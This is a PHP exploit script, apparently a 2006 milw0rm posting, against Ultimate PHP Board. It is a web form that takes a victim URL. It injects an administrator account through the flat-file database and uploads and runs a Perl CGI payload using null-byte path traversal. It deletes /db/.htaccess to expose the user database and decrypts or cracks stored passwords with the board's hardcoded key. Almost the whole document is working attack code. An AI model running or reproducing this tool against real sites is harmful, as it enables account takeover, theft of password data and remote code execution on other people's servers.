<?php
/*
Advisory:
http://www.kliconsulting.com/users/mbrooks/UPBadvisory.rtf
Vendors site:
http://forum.myupb.com/
Download:
http://fileserv.myupb.com/download.php?url=upb196GOLD.zip
http://prdownloads.sourceforge.net/textmb/upb1.8.2.zip?download
Download Mirror:
http://www.kliconsulting.com/users/mbrooks/upb196GOLD.zip
http://www.kliconsulting.com/users/mbrooks/upb1.8.2.zip
*/
//perl cgi code to inject into vulnerable system:
//payload should start with [NR] and end with #;
$perlPayload="[NR] use CGI qw(:standard);print header;print \" start \";print \" 0-day  \";print \" exploit \"; print \" code  end \";#";

$v1_xKey="wdnyyjinffnruxezrkowkjmtqhvrxvolqqxokuofoqtneltaomowpkfvmmogbayankrnrhmbduzfmpctxiidweripxwglmwrmdscoqyijpkzqqzsuqapfkoshhrtfsssmcfzuffzsfxdwupkzvqnloubrvwzmsxjuoluhatqqyfbyfqonvaosminsxpjqebcuiqggccl";
//taken from ./textdb.inc.php line 324:

function t_decrypt($text,$key){
    $crypt = "";
    for($i=0;$i<strlen($text);$i++)
    {
        $i_key = ord(substr($key, $i, 1));
        $i_text = ord(substr($text, $i, 1));
        $n_key = ord(substr($key, $i+1, 1));
        $i_crypt = $i_text + $n_key;
        $i_crypt = $i_crypt - $i_key;
        $crypt .= chr($i_crypt);
    }
    return $crypt;
}


function t_encrypt($text, $key)
{
    $crypt = "";
    for($i=0;$i<strlen($text);$i++)
    {
//	print $i."key char:".substr($key, $i, 1)."<br>";
        $i_key = ord(substr($key, $i, 1));
  //     print $i."ikey:".$i_key."<br>";
	$i_text = ord(substr($text, $i, 1));
//	print $i."itext:".$i_text."<br>";
        $n_key = ord(substr($key, $i+1, 1));
//	print $i."nkey:".$n_key."<br>";
	
        $i_crypt = $i_text + $i_key;
//	print  $i."T+K_crypt:".$i_crypt ."<br>";
        $i_crypt = $i_crypt - $n_key;
//	print $i."I-N_crypt:".$i_crypt."<br>";
        $crypt .= chr($i_crypt);

	$offset0=$i_crypt-$i_text;
//	print "key=$i_key - $n_key<br>";
//	print "offset0:$offset0=$i_crypt-$i_text<br>";
	$offset=$i_key-$n_key;
	//print "offset:$offset<br>";
//	$broken=$i_text+$offset;
//	print "broken:".$broken;	

    }
    return $crypt;
}

function gen_collision($offset, $start){//$start should be a number of an ascii char
   $offset_len=strlen($offset);
   $x=0;
 //  print "len:".$offset_len."<br>";
  // for($x=0;$x<$offset_len;$x++){//$offset as $off_int){
  foreach($offset as $off_char){
	if($x==0){
		$newkey.=chr($start);
		$nextchar=$start;
		$x++;
	}
//	print "next char: $nextchar "."offset:".$off_char."<br>";
	$tmp=$nextchar - $off_char;
	$newkey.=chr($tmp);
	$nextchar=$tmp;
   }
   return $newkey;
}

function gen_offset($crypt,$text){
	$text_len=strlen($text);
	for($x=0;$x<$text_len;$x++){
//		print "crypt:".substr($crypt, $x, 1).'text:'.substr($text, $x, 1).'<br>';
		$cry_hex=ord(substr($crypt, $x, 1));
		$txt_hex=ord(substr($text, $x, 1));
		$offset[$x]=$cry_hex - $txt_hex;
		//print "offset".$offset."crypt".$cry_hex."text".$txt_hex[x]."<br>";
	}
	return $offset;//numeric array
}


function http_gpc_send( $method, $host, $port ,$usepath,$cookie="", $postdata = "") {
 $fp = pfsockopen( $host, $port, &$errno, &$errstr, 120 );
 # user-agent name
 $ua = "msnbot/1.0 (+http://search.msn.com/msnbot.htm)";

 if( !$fp ) {
    print "$errstr ($errno)<br>\nn";
 } else {
    if( $method == "GET" ) {
        fputs( $fp, "GET $usepath HTTP/1.0\n" );
    }
    else if( $method == "POST" ) {
        fputs( $fp, "POST $usepath HTTP/1.0\n" );
    }
    
    fputs( $fp, "User-Agent: ".$ua."\n" );
    fputs($fp, "Host: ".$host."\n");
    fputs( $fp, "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n" );
    fputs( $fp, "Accept-Language: en-us,en;q=0.5\n" );
    fputs( $fp, "Accept-Encoding: gzip,deflate\n" );
    fputs( $fp, "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n" );
    fputs( $fp, "Cookie: ".$cookie."\n" );
   
   if( $method == "POST" ) {
	$strlength = strlen( $postdata );
        fputs( $fp, "Content-type: application/x-www-form-urlencoded\n" );
        fputs( $fp, "Content-length: ".$strlength."\n\n" );
        fputs( $fp, $postdata."\n\n");
    }
    fputs( $fp, "\n\n" );
    
   $output = "";
   while( !feof( $fp ) ) {
        $output .= fgets( $fp, 1024 );
   }
    fclose( $fp );
 }
 return $output;
 }

function getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env){
    $exp_power_env="3";//admin
    $InjectUserPost="u_login=te".rand()."1&u_email=rew".rand()."@wfje.com&u_loca=&u_site=&avatar=images%2Favatars%2Fnoavatar.gif&u_icq=&u_aim=&u_msn=&u_sig=s%3C%7E%3E0%3C%7E%3E2006-04-20%5BNR%5D".$exp_user_env."%3C%7E%3E".$exp_pass_env."%3C%7E%3E".$exp_power_env."%3C%7E%3EA%40a.com%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E1%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E13%3C%7E%3E%3C%7E%3E1%3C%7E%3E".$exp_id_env."&submit=Submit";
    http_gpc_send("POST", $victHost, $victPort, $victPath."/register.php", "", $InjectUserPost);
}


if(isset($_REQUEST['vict'])){
    $payName="data".rand().".cgi";//must be .cgi
    $expPost="u_name=Admin&subject=hey&icon=#!/usr/bin/perl -wT \"&message=$perlPayload&id=/../images/$payName%00";
    $exp_user_env="Jockie227";
    $exp_pass_env="tZbi}";
    $exp_power_env="3";
    $exp_id_env=4000000000+rand(0,300000000);
    //The script is injecting user into the database;  becase of this the cookie is known before the script even contacts the vulnerable "Ultamate PHP Boar".  Also note that a time stamp is not needed. 
    $cookie="user_env=$exp_user_env; pass_env=$exp_pass_env; power_env=$exp_power_env; id_env=$exp_id_env";

    $url_parsed = parse_url($_REQUEST['vict']);
    if ( empty($url_parsed['scheme']) ) {
        $url_parsed = parse_url('http://'.$url);
    }
    $rtn['url'] = $url_parsed;
    $victPort = $url_parsed["port"];
    if ( !$port ) {
        $victPort = 80;
    }
    $victPath = $url_parsed["path"];
    $victHost = $url_parsed["host"];

    print "<title> Ultamate PHP Board Remote Code EXEC 0-Day </title>";
    print "<CENTER><B><I>0-day</I></B></CENTER>";

    //injecting user into database,  this information is used to verify session information
    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env);
  //http_gpc_send("POST", $victHost, $victPort, $victPath."/register.php", "", $InjectUserPost);

   // http_gpc_send("GET", $victHost, $victPort, $victPath."/open.php?id=../images%00", $cookie);

    //uploading CGI
    $field=http_gpc_send("POST", $victHost, $victPort, $victPath."/newpost.php?a=1&t=1&page=1", $cookie, $expPost);
    //making cgi executeable usei "close.php"
    http_gpc_send("GET", $victHost, $victPort, $victPath."/close.php?id=../images/".$payName."%00", $cookie);
    //executing cgi
    $feedBack=http_gpc_send("GET",$victHost, $victPort, $victPath."/images/".$payName);
    $field = str_replace("<", "&lt;", $field);
    $field = str_replace(">", "&gt;", $field);
   // print $field;
    print $feedBack;
    exit;
}elseif(isset($_REQUEST['victHTA'])){
    $expPost="u_name=#&message=#&id=/.htaccess%00";
    $exp_user_env="Jockie227";
    $exp_pass_env="tZbi}";
    $exp_power_env="3";
    $exp_id_env=4000000000+rand(0,300000000);
    //The script is injecting user into the database;  becase of this the cookie is known before the script even contacts the vulnerable Ultamate PHP Board.  Also note that a time stamp is not needed. 
    $cookie="user_env=$exp_user_env; pass_env=$exp_pass_env; power_env=$exp_power_env; id_env=$exp_id_env";

    $url_parsed = parse_url($_REQUEST['victHTA']);
    if ( empty($url_parsed['scheme']) ) {
        $url_parsed = parse_url('http://'.$url);
    }
    $rtn['url'] = $url_parsed;
    $victPort = $url_parsed["port"];
    if ( !$port ) {
        $victPort = 80;
    }
    $victPath = $url_parsed["path"];
    $victHost = $url_parsed["host"];

    //injecting user into database,  this information is used to verify session information
    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env);
    //
    $field=http_gpc_send("POST", $victHost, $victPort, $victPath."/newpost.php?a=1&t=1&page=1", $cookie, $expPost);
   // $field = str_replace("<", "&lt;", $field);
   // $field = str_replace(">", "&gt;", $field);
   // print $field;
   print "<script>window.location=\"".$_REQUEST['victHTA']."/db/\";</script>" ;
    exit;
}else if(isset($_REQUEST['addVict'])){
    $url_parsed = parse_url($_REQUEST['addVict']);
    if ( empty($url_parsed['scheme']) ) {
        $url_parsed = parse_url('http://'.$url);
    }
    $rtn['url'] = $url_parsed;
    $victPort = $url_parsed["port"];
    if ( !$port ) {
        $victPort = 80;
    }
    $victPath = $url_parsed["path"];
    $victHost = $url_parsed["host"];

    $exp_user_env=$_REQUEST["addName"];
    $exp_pass_env=t_encrypt($_REQUEST["addPass"],$v1_xKey);
    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,4000000000+rand(0,300000000));
    print "<title> Ultamate PHP Board Remote Code EXEC 0-Day </title>";
    print "<CENTER><B> Admin login Name:".$_REQUEST["addName"]."</B></CENTER>";//this exploit code suffers from xss!
    print "<CENTER><B> Admin login Password:".$_REQUEST["addPass"]."</B></CENTER>";
    exit;
}else if(isset($_REQUEST['decrypt'])){
    print "<I>ecrypted password:</I>";
    print "<CENTER>".$_REQUEST["decrypt"]."</CENTER>";
    print "<B>Decrypted password:</B>";
    print "<CENTER><B>".t_decrypt($_REQUEST["decrypt"],$v1_xKey)."</B></CENTER>";
    exit;
}else if(isset($_REQUEST['encrypt'])){
    print "<I>ecrypted password:</I>";
    print "<CENTER>".$_REQUEST["encrypt"]."</CENTER>";
    print "<B>Decrypted password:</B>";
    print "<CENTER><B>".t_encrypt($_REQUEST["encrypt"],$v1_xKey)."</B></CENTER>";
  //  print get_key(t_encrypt($_REQUEST["encrypt"],$v1_xKey),$_REQUEST["encrypt"]);
    exit;
}else if(isset($_REQUEST['cypher'])&&isset($_REQUEST['plain'])){
	$cypher_len=strlen($_REQUEST['cypher']);
	$offset=gen_offset($_REQUEST['cypher'],$_REQUEST['plain']);
	print "Offset:";
	for($x=0;$x<$cypher_len;$x++){
		print  $offset[$x].':';
	}
	print '<br>';
	$validKeys=0;
	$y=0;
	for($y=255;$y>=0;$y--){
		$newKey[$y]=gen_collision($offset,$y);
		$key_len=strlen($newKey[$y]);
		print "<br>Key:$y  = ";
		for($x=0;$x<=$key_len;$x++){
			print  $newKey[$y][$x];
		}			
		print  "<br>Cypher:".t_encrypt($_REQUEST['plain'],$newKey[$y]);			
		print "<br>Plain     :".t_decrypt($_REQUEST['cypher'],$newKey[$y])."<br><br>";
	}
	exit;
}

print "<title> Ultimate PHP Board Remote Code EXEC 0-Day </title>
    
    <CENTER><B><I>0-day</I></B></CENTER>
     ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>
    <B><I>Get Admin</I></B><br>
    <B>Inject an administrative account into UPB:</B>
    <p>
    <form ACTION=".$_SERVER['PHP_SELF']." method=\"post\"> 
    <p>
    Path to attack:<i>(example: http://www.domain.ext/PathToUPB)</i><br>
    <input name=\"addVict\" type=\"text\" size=60> <br>
    Inject Name:<br>
    <input name=\"addName\" type=\"text\" size=60> <br>
    Inject Password:<br>
    <input name=\"addPass\" type=\"text\" size=60> <br>
    <p>    
    <input type=\"submit\" value=\"Inject Admin\">     
    </form>
    
    <p>
    <B>PHP code injection is possilbe in the admin panel without an exploit.  Both admin_config.php and admin_config2.php can be used to execute PHP by tagging on: '  \";phpinfo(); \$crap=\"1  ' to any of the config values </B>( double quotes \" are only used in exploit)</B>
    <p>  
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>
    <B><I>Gain Read Access To The Database</I></B>

   <form ACTION=".$_SERVER['PHP_SELF']." method=\"post\"> 
    <p>
    Removes  /db/.htaccess to allow access to the remote target's flat file database:<i>(example: http://www.domain.ext/PathToUPB  [no trailing slash]) (user database in /db/users.dat) </i><br><br>
    <input name=\"victHTA\" type=\"text\" size=60> <br>
    <p>    
    <input type=\"submit\" value=\"Attack\">
    </form>    
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>
    <B><I>Crypto</I></B>  
	
   <form ACTION=".$_SERVER['PHP_SELF']." method=\"post\"> 
    <p>
    Plain Text Password:<br>
    <input name=\"encrypt\" type=\"text\" size=60> <br>
    <p>    
    <input type=\"submit\" value=\"Encrypt\">     
    </form>
    <form ACTION=".$_SERVER['PHP_SELF']." method=\"post\"> 
    Encrypted Password:<br>
    <input name=\"decrypt\" type=\"text\" size=60> <br>
    <p>    
    <input type=\"submit\" value=\"Decrypt\">     
    </form>
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>  
    <form ACTION=".$_SERVER['PHP_SELF']." method=\"post\"> 
    <p>
    Plain Text:<br>
    <input name=\"plain\" type=\"text\" size=60> <br>
    <p>    
    corosponding cypher text:<br>
    <input name=\"cypher\" type=\"text\" size=60> <br>
    <p>    
    <input type=\"submit\" value=\"crack key\">     
    </form>
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>
   <B><I>Proof of Concept Only,  Unstable Remote Code Execution Using NON-SQL Database Injection</I></B>
    <form ACTION=".$_SERVER['PHP_SELF']." method=\"post\"> 
    <p>
     perl CGI Code Injection Attack Remote Target:<br>
    <input name=\"vict\" type=\"text\" size=60> <br>
    <p>    
    <input type=\"submit\" value=\"Attack\">
    </form>
    
    <B>http://www.domain.ext/PathToUPB  (no trailing slash)</B>
    </body>";
?>

# milw0rm.com [2006-06-20]
